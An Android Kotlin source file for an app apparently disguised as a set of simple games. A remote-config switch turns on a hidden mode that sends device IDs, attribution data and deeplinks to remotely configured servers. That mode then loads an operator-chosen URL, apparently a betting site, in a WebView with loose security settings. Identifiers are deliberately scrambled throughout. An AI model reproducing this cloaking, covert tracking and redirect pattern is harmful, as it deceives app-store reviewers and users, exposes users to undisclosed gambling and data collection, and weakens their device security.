package com.bets.cas.betandre

import android.graphics.Bitmap
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.webkit.*
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.bets.cas.betandre.databinding.ActivityMainBinding
import com.bets.cas.betandre.inti.sharedkey
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import org.json.JSONObject
import java.util.*


lateinit var bindingMain: ActivityMainBinding
lateinit var hfdjsjfsad: Map<String, Any>
lateinit var fierConfigs: FirebaseRemoteConfig
var deeplinks: String? = null
var ssilkanomer1: String? = null
var ssilkanomer2: String? = null
var apsflyers: String? = null
var checkopens: Boolean = false
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindingMain = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindingMain.root)
        val mainid = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        apsflyers = mainid
        fierINITS()

        bindingMain.button.setOnClickListener {
        bindingMain.button.visibility = View.GONE
        bindingMain.button2.visibility = View.GONE
            bindingMain.button3.visibility = View.GONE

            bindingMain.cont.visibility = View.VISIBLE
            supportFragmentManager
                .beginTransaction()
                .replace(bindingMain.cont.id, GameFragment())
                .commit()

        }

    bindingMain.button2.setOnClickListener {
    bindingMain.button.visibility = View.GONE
    bindingMain.button2.visibility = View.GONE
    bindingMain.button3.visibility = View.GONE
    bindingMain.cont.visibility = View.VISIBLE
    supportFragmentManager
        .beginTransaction()
        .replace(bindingMain.cont.id, game2())
        .commit()

}

        bindingMain.button3.setOnClickListener {
            bindingMain.button.visibility = View.GONE
            bindingMain.button2.visibility = View.GONE
            bindingMain.button3.visibility = View.GONE
            bindingMain.cont.visibility = View.VISIBLE
            supportFragmentManager
                .beginTransaction()
                .replace(bindingMain.cont.id, mathgame())
                .commit()


        }

    }

    private fun fierINITS() {
        fierConfigs = FirebaseRemoteConfig.getInstance()
        val realconfigs = FirebaseRemoteConfigSettings.Builder().setMinimumFetchIntervalInSeconds(3600).build()
        fierConfigs.setConfigSettingsAsync(realconfigs)
        fierConfigs.setDefaultsAsync(R.xml.remote_config_defaults)

        fierConfigs.fetchAndActivate()
            .addOnCompleteListener(this) { task ->

                if (task.isSuccessful) {

                    val checkWindowWeb: Boolean = fierConfigs.getBoolean("openW")

                    if (checkWindowWeb == true) {
                        ssilkanomer1 = fierConfigs.getString("url1")
                        ssilkanomer2 = fierConfigs.getString("url2")
                        OpenApp(apsflyers!!)
                        facebookInits()
                        apsflyerinitializations()

                    } else {
                          bindingMain.lotie.visibility = View.GONE
                        bindingMain.textView2.visibility = View.GONE
                        bindingMain.game.visibility = View.VISIBLE
                    }

                } else {
                    Toast.makeText(this, "Fail", Toast.LENGTH_SHORT).show()

                }

            }
    }


        private fun apsflyerinitializations() {
            AppsFlyerLib.getInstance().setDebugLog(true)

            val getConversions: AppsFlyerConversionListener = object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(getDataListener: Map<String, Any>) {
                    try {
                        hfdjsjfsad = getDataListener
//
                        ovnoInit(apsflyers)
                        huyina(apsflyers)



                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }

                override fun onConversionDataFail(em: String) {
                    runOnUiThread {
                       bindingMain.lotie.visibility = View.GONE
                        bindingMain.textView2.visibility = View.GONE
                        bindingMain.game.visibility = View.VISIBLE
                    }
                }

                override fun onAppOpenAttribution(atr: Map<String, String>) {
                    runOnUiThread {
                        bindingMain.lotie.visibility = View.GONE
                        bindingMain.textView2.visibility = View.GONE
                        bindingMain.game.visibility = View.VISIBLE
                    }
                }

                override fun onAttributionFailure(em: String) {
                    runOnUiThread {
                        bindingMain.lotie.visibility = View.GONE
                        bindingMain.textView2.visibility = View.GONE
                        bindingMain.game.visibility = View.VISIBLE
                    }
                }
            }
            AppsFlyerLib.getInstance().init(sharedkey.apsf, getConversions, this)
            AppsFlyerLib.getInstance().registerConversionListener(this, getConversions)
            AppsFlyerLib.getInstance().start(this)
        }


    private fun huyina(idAppPhone: String?) {
        val fxghjhgbvfdbnm = Volley.newRequestQueue(this)
        val dfghjkjhgbfdghftygjhkmnb = JSONObject()
        dfghjkjhgbfdghftygjhkmnb.put("name", "a_o_e")
        val gtjyghkljkjhgfghjk = JSONObject()
        gtjyghkljkjhgfghjk.put("success", true)
        dfghjkjhgbfdghftygjhkmnb.put("data", gtjyghkljkjhgfghjk)
        dfghjkjhgbfdghftygjhkmnb.put("created", gfzdcghnvhcgfzd())
        var fgikhjghgfdfh = ssilkanomer2

        val tfygjukjhgfedfghjkhg = object: JsonObjectRequest(
            Request.Method.POST, fgikhjghgfdfh, dfghjkjhgbfdghftygjhkmnb,
            { response ->
                Log.i("a_o_e", "Response is: $response")
            }, { error ->
                Log.i("a_o_e", "Response is: $error")
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val hjhgfdsghjhkmbvfdghhj: MutableMap<String, String> = HashMap()
                hjhgfdsghjhkmbvfdghhj["Device-UUID"] = apsflyers!!
                return hjhgfdsghjhkmbvfdghhj
            }
        }
        fxghjhgbvfdbnm.add(tfygjukjhgfedfghjkhg)
    }

    private fun ovnoInit(idAppPhone: String?) {


        val gghjjhgfmhnfgfgdxcgh = Volley.newRequestQueue(this)
        val ykjlkhmngbvfddghfgjhn = JSONObject()
        ykjlkhmngbvfddghfgjhn.put("appsFlyerId", apsflyers)
        val drtfyguhkimjhngbvfesrgdthy = JSONObject(hfdjsjfsad)
        ykjlkhmngbvfddghfgjhn.put("apsInfo", drtfyguhkimjhngbvfesrgdthy)
        ykjlkhmngbvfddghfgjhn.put("deeplink", if(deeplinks == null) JSONObject.NULL else deeplinks)

        var ertyjukijhgbfrgh = ssilkanomer1

        val rtyukijhgfvdsfrgh = object: JsonObjectRequest(
            Request.Method.POST, ertyjukijhgbfrgh, ykjlkhmngbvfddghfgjhn,
            { response ->
                if(response.getBoolean("success")) {

                    checkopens = true
                    bindingMain.webview.settings.javaScriptEnabled = true
                    bindingMain.webview.settings.domStorageEnabled = true
                    bindingMain.webview.settings.useWideViewPort = true
                    bindingMain.webview.settings.loadWithOverviewMode = true
                    bindingMain.webview.settings.allowFileAccess = true
                    bindingMain.webview.settings.javaScriptCanOpenWindowsAutomatically = true
                    bindingMain.webview.settings.setSupportMultipleWindows(false)
                    bindingMain.webview.settings.displayZoomControls = false
                    bindingMain.webview.settings.builtInZoomControls = true
                    bindingMain.webview.settings.setSupportZoom(true)
                    bindingMain.webview.settings.pluginState = WebSettings.PluginState.ON
                    bindingMain.webview.settings.mixedContentMode = 0
                    bindingMain.webview.settings.setAppCacheEnabled(true)
                    bindingMain.webview.settings.allowContentAccess = true
                    CookieManager.getInstance().setAcceptCookie(true)
                    CookieManager.getInstance().setAcceptThirdPartyCookies(bindingMain.webview, true)
                    val ffhghjvgfvcdzfxgh: String = AppsFlyerLib.getInstance().getAppsFlyerUID(this)!!
                    bindingMain.webview.webViewClient = object : WebViewClient() {
                        override fun onPageStarted(fbvngvfdcs: WebView?, hvgnfbvdcxs: String?, gthjkjmvhngbfvd: Bitmap?) {
                            super.onPageStarted(fbvngvfdcs, hvgnfbvdcxs, gthjkjmvhngbfvd)

                        }

                        override fun onPageFinished(gfvdsadfg: WebView, dfghjklkmjhgnbgvfd: String) {
                            bindingMain.webview.visibility = View.VISIBLE
                            //  bindingM.progressBar2.visibility = View.GONE
                            bindingMain.lotie.visibility = View.GONE
                            bindingMain.textView2.visibility = View.GONE

                        }

                        override fun onReceivedHttpError(
                            dfghnjmjhnbgvfcdx: WebView?,
                            fghjkjhgvcdxs: WebResourceRequest?,
                            rfghjkkmnhgbvfcdxs: WebResourceResponse?
                        ) {
                            super.onReceivedHttpError(dfghnjmjhnbgvfcdx, fghjkjhgvcdxs, rfghjkkmnhgbvfcdxs)

                            sadfghjmnbvcvbj(ffhghjvgfvcdzfxgh, fghjkjhgvcdxs!!.url.toString(), rfghjkkmnhgbvfcdxs.toString() + " " + rfghjkkmnhgbvfcdxs!!.statusCode)
                        }

                        @RequiresApi(Build.VERSION_CODES.M)
                        override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
                            super.onReceivedError(view, request, error)

                            sadfghjmnbvcvbj(ffhghjvgfvcdzfxgh, request!!.url.toString(), error.toString())
                        }
                    }
                    bindingMain.webview.loadUrl(response.getString("url"))

                }
                else{

                    bindingMain.lotie.visibility = View.GONE
                    bindingMain.textView2.visibility = View.GONE
                    bindingMain.game.visibility = View.VISIBLE
                }
            }, { error ->
                bindingMain.lotie.visibility = View.GONE
                bindingMain.textView2.visibility = View.GONE
                bindingMain.game.visibility = View.VISIBLE
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val cgnbcgvfcdzfgfhnvvc: MutableMap<String, String> = HashMap()
                cgnbcgvfcdzfgfhnvvc["Device-UUID"] = apsflyers!!
                return cgnbcgvfcdzfgfhnvvc
            }
        }
        gghjjhgfmhnfgfgdxcgh.add(rtyukijhgfvdsfrgh)
    }

    private fun sadfghjmnbvcvbj(gmnbvcvbnm: String, dfghnmjnbf: String, s: String) {
        val cdfvgbhjgcfvxdfcgvb = Volley.newRequestQueue(this)
        val ghmvcbvcdzfvhgn = JSONObject()
        ghmvcbvcdzfvhgn.put("name", "a_e_w")
        val sdfghhgfdfgbhnhbcv = JSONObject()
        sdfghhgfdfgbhnhbcv.put("success", true)
        sdfghhgfdfgbhnhbcv.put("url", ssilkanomer1)
        sdfghhgfdfgbhnhbcv.put("error", s)

        ghmvcbvcdzfvhgn.put("data", sdfghhgfdfgbhnhbcv)
        ghmvcbvcdzfvhgn.put("created", gfzdcghnvhcgfzd())
        var hjvgfxdghbbngbvfcdzxc = ssilkanomer2

        val dfgbhngdfgjhkmbnbv = object: JsonObjectRequest(
            Request.Method.POST, hjvgfxdghbbngbvfcdzxc, ghmvcbvcdzfvhgn,
            { response ->
                Log.i("Volley", "Response is: $response")
            }, { error ->
                Log.i("Volley", "Response is: $error")
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val frghjkhhcgxfz: MutableMap<String, String> = java.util.HashMap()
                frghjkhhcgxfz["Device-UUID"] = apsflyers!!
                return frghjkhhcgxfz
            }
        }
        cdfvgbhjgcfvxdfcgvb.add(dfgbhngdfgjhkmbnbv)
    }

    private fun facebookInits() {

        FacebookSdk.sdkInitialize(applicationContext)
        FacebookSdk.setAdvertiserIDCollectionEnabled(true)
        FacebookSdk.setApplicationId(fierConfigs.getString("facebook"))// вставить фейсбук айди
        Log.d("FBID", "${fierConfigs.getString("facebook")}")
        AppLinkData.fetchDeferredAppLinkData(
            this
        ) {
            if(it==null){
                deeplinks = it.toString()
            } else {
                deeplinks = it.getTargetUri().toString()
            }
        }
    }

    private fun OpenApp(str: String) {
        val hgncbfdsfghvhj = Volley.newRequestQueue(this)
        val fghkvhcgbvfxdczfvgbn = JSONObject()
        fghkvhcgbvfxdczfvgbn.put("name", "a_o")
        val rfghjkhgfxghj = JSONObject()
        rfghjkhgfxghj.put("success", true)
        fghkvhcgbvfxdczfvgbn.put("data", rfghjkhgfxghj)
        fghkvhcgbvfxdczfvgbn.put("created", gfzdcghnvhcgfzd())
        var fjkhkjhgffghjk = ssilkanomer2
        val hjkigfdsfrghj = object: JsonObjectRequest(
            Request.Method.POST, fjkhkjhgffghjk, fghkvhcgbvfxdczfvgbn,
            { response ->
                Log.i("VolleyNum1", "Response is: $response")
            }, { error ->
                Log.i("VolleyNum2", "Response is: $error")
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val jvhcgxfzdfgchvg: MutableMap<String, String> = HashMap()
                jvhcgxfzdfgchvg["Device-UUID"] = str
                Log.d("IDDEVICE", "$str")
                return jvhcgxfzdfgchvg
            }
        }
        hgncbfdsfghvhj.add(hjkigfdsfrghj)
    }

    private fun gfzdcghnvhcgfzd(): Long {
        val mngbvffghmhgb: Date = Calendar.getInstance().time
        return mngbvffghmhgb.time
    }
    override fun onKeyDown(nbvfdxfvn: Int, fghjkmjhgfdx: KeyEvent?): Boolean {
        if ((nbvfdxfvn == KeyEvent.KEYCODE_BACK) && bindingMain.webview.canGoBack()) {
            bindingMain.webview.goBack()
            return true
        }

        return super.onKeyDown(nbvfdxfvn, fghjkmjhgfdx)
    }
    override fun onBackPressed() {
        if ( bindingMain.webview.isFocused() &&  bindingMain.webview.canGoBack()) {
            bindingMain.webview.goBack()
        } else {
        }
    }
}
